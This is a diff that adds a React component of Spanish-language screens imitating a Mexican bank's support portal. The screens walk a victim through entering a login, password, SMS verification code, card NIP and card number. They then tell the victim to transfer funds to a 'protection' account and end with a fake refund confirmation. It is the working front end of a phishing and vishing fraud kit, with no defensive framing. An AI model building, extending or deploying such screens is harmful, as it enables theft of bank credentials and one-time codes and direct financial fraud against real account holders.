@@ -1,0 +1,263 @@
+import React, { useState } from 'react';
+import { Card } from '@/components/ui/card';
+import { Input } from '@/components/ui/input';
+import { Button } from '@/components/ui/button';
+import { ScreenType } from '@shared/schema';
+
+interface ScreenTemplatesProps {
+  currentScreen: ScreenType;
+  screenData: {
+    terminacion?: string;
+    saldo?: string;
+    monto?: string;
+    clabe?: string;
+    titular?: string;
+    comercio?: string;
+    mensaje?: string;
+  };
+  onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
+}
+
+export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
+  currentScreen, 
+  screenData,
+  onSubmit
+}) => {
+  // Form state
+  const [folioInput, setFolioInput] = useState('');
+  const [loginInputs, setLoginInputs] = useState({ username: '', password: '' });
+  const [codigoInput, setCodigoInput] = useState('');
+  const [nipInput, setNipInput] = useState('');
+  const [tarjetaInput, setTarjetaInput] = useState('');
+
+  // Helper function to render the appropriate screen
+  const renderScreen = () => {
+    switch (currentScreen) {
+      case ScreenType.FOLIO:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-3">Folio de soporte:</h2>
+            <p className="mb-4">Ingrese el folio que su ejecutivo le proporcionó.</p>
+            <Input 
+              type="text" 
+              placeholder="Ingrese su número de folio" 
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={folioInput}
+              onChange={(e) => setFolioInput(e.target.value)}
+            />
+            <Button 
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
+            >
+              Ingresar
+            </Button>
+          </div>
+        );
+
+      case ScreenType.LOGIN:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-3">Inicio de sesión:</h2>
+            <p className="mb-4">Ingrese su usuario y contraseña.</p>
+            <Input 
+              type="text" 
+              placeholder="Usuario" 
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={loginInputs.username}
+              onChange={(e) => setLoginInputs(prev => ({ ...prev, username: e.target.value }))}
+            />
+            <Input 
+              type="password" 
+              placeholder="Contraseña" 
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={loginInputs.password}
+              onChange={(e) => setLoginInputs(prev => ({ ...prev, password: e.target.value }))}
+            />
+            <Button 
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              onClick={() => onSubmit(ScreenType.LOGIN, loginInputs)}
+            >
+              Ingresar
+            </Button>
+          </div>
+        );
+
+      case ScreenType.CODIGO:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-3">Hemos enviado un código de verificación</h2>
+            <p className="mb-4">
+              Ingresa el código que recibiste en tu número celular terminación: <strong>{screenData.terminacion || "****"}</strong>
+            </p>
+            <Input 
+              type="text" 
+              placeholder="Ingrese el SMS recibido" 
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={codigoInput}
+              onChange={(e) => setCodigoInput(e.target.value)}
+            />
+            <Button 
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              onClick={() => onSubmit(ScreenType.CODIGO, { codigo: codigoInput })}
+            >
+              Continuar
+            </Button>
+          </div>
+        );
+
+      case ScreenType.NIP:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-3">Ingresa tu NIP</h2>
+            <p className="mb-4">Para continuar, por favor ingresa el NIP de tu tarjeta.</p>
+            <Input 
+              type="password" 
+              placeholder="Ingrese su NIP" 
+              maxLength={4}
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={nipInput}
+              onChange={(e) => setNipInput(e.target.value)}
+            />
+            <Button 
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              onClick={() => onSubmit(ScreenType.NIP, { nip: nipInput })}
+            >
+              Continuar
+            </Button>
+          </div>
+        );
+
+      case ScreenType.PROTEGER:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <div className="text-4xl mb-2">⚠️</div>
+            <h2 className="text-xl font-bold mb-3">Es necesario proteger su saldo</h2>
+            <p className="mb-4">Se creará una cuenta de TOTAL PROTECCIÓN para respaldar su saldo.</p>
+            <div className="p-3 bg-gray-100 rounded mb-4">
+              Saldo sin proteger: <strong>{screenData.saldo || "$39,499,494"}</strong>
+            </div>
+            <Button 
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              onClick={() => onSubmit(ScreenType.PROTEGER, { proteger: true })}
+            >
+              Continuar
+            </Button>
+          </div>
+        );
+
+      case ScreenType.TRANSFERIR:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-3">Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
+            <p className="mb-4">
+              Transfiera la cantidad de <strong>{screenData.monto || "$39,933"}</strong> a la siguiente cuenta:
+            </p>
+            <div className="text-left p-4 bg-gray-100 rounded mb-4">
+              <p><strong>Clabe:</strong> <span>{screenData.clabe || "272762626262727272727272266222"}</span></p>
+              <p><strong>Titular:</strong> <span>{screenData.titular || "Juan Pérez"}</span></p>
+              <p><strong>Alias:</strong> Cuenta de respaldo.</p>
+            </div>
+            <Button 
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              onClick={() => onSubmit(ScreenType.TRANSFERIR, { transferencia: true })}
+            >
+              Confirmar transferencia
+            </Button>
+          </div>
+        );
+
+      case ScreenType.TARJETA:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-3">Protección adicional</h2>
+            <p className="mb-4">Para evitar compras en línea no autorizadas, agregue protección a su tarjeta.</p>
+            <Input 
+              type="text" 
+              placeholder="Número de tarjeta" 
+              className="w-full border border-gray-300 rounded p-2 mb-3"
+              value={tarjetaInput}
+              onChange={(e) => setTarjetaInput(e.target.value)}
+            />
+            <Button 
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              onClick={() => onSubmit(ScreenType.TARJETA, { tarjeta: tarjetaInput })}
+            >
+              Continuar
+            </Button>
+            <div className="mt-4">
+              <a href="#" className="text-blue-600 block mt-2 text-sm">Nueva aclaración</a>
+              <a href="#" className="text-blue-600 block mt-2 text-sm">Estatus de mis aclaraciones</a>
+            </div>
+          </div>
+        );
+
+      case ScreenType.CANCELACION:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-3">Cancelación exitosa</h2>
+            <p className="mb-3">Hemos cancelado su cargo no reconocido de forma exitosa.</p>
+            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
+              <p><strong>Comercio:</strong> <span>{screenData.comercio || "Liverpool en línea"}</span></p>
+              <p><strong>Monto devuelto:</strong> <span>{screenData.monto ? `$${screenData.monto}` : "$6,262"}</span></p>
+            </div>
+            <p className="mb-4">El monto estará disponible en su tarjeta dentro de 72 horas.</p>
+            <Button 
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              onClick={() => onSubmit(ScreenType.CANCELACION, { finalizado: true })}
+            >
+              Finalizar
+            </Button>
+          </div>
+        );
+
+      case ScreenType.MENSAJE:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-3">Mensaje del banco</h2>
+            <div className="p-4 bg-gray-100 rounded mb-4 text-left">
+              <p>{screenData.mensaje || "Mensaje personalizado del banco."}</p>
+            </div>
+            <Button 
+              className="bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors"
+              onClick={() => onSubmit(ScreenType.MENSAJE, { leido: true })}
+            >
+              Entendido
+            </Button>
+          </div>
+        );
+
+      case ScreenType.VALIDANDO:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-4">Validando...</h2>
+            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
+              <div className="h-full bg-[#e10098] animate-progress-bar"></div>
+            </div>
+          </div>
+        );
+
+      default:
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <h2 className="text-xl font-bold mb-3">Pantalla no disponible</h2>
+            <p>La pantalla solicitada no está disponible en este momento.</p>
+          </div>
+        );
+    }
+  };
+
+  return (
+    <>
+      <style jsx>{`
+        @keyframes progress {
+          0% { width: 0; }
+          100% { width: 100%; }
+        }
+        .animate-progress-bar {
+          animation: progress 3s linear forwards;
+        }
+      `}</style>
+      {renderScreen()}
+    </>
+  );
+};
